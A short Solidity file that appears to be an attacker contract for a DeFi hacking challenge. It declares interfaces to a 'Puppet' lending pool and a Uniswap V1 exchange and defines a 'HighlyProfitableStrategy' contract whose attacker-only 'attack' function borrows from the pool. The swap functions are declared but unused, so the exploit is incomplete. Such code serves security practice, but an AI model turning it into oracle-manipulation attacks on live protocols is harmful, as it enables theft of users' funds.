// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface IPuppetPool {
    function borrow(uint256) external;
}

interface UniswapV1Exchange {
    function addLiquidity(
        uint256 min_liquidity,
        uint256 max_tokens,
        uint256 deadline
    ) external payable returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold)
        external
        view
        returns (uint256);
}

contract HighlyProfitableStrategy {
    address private _attacker;
    address private _puppetPool;
    address private _uniswapPool;

    error OnlyAttacker();

    constructor(address puppetPool, address uniswapPool) {
        _attacker = msg.sender;
        _puppetPool = puppetPool;
        _uniswapPool = uniswapPool;
    }

    function attack(uint256 amount) external {
        if (msg.sender != _attacker) revert OnlyAttacker();
        IPuppetPool(_puppetPool).borrow(amount);
    }
}
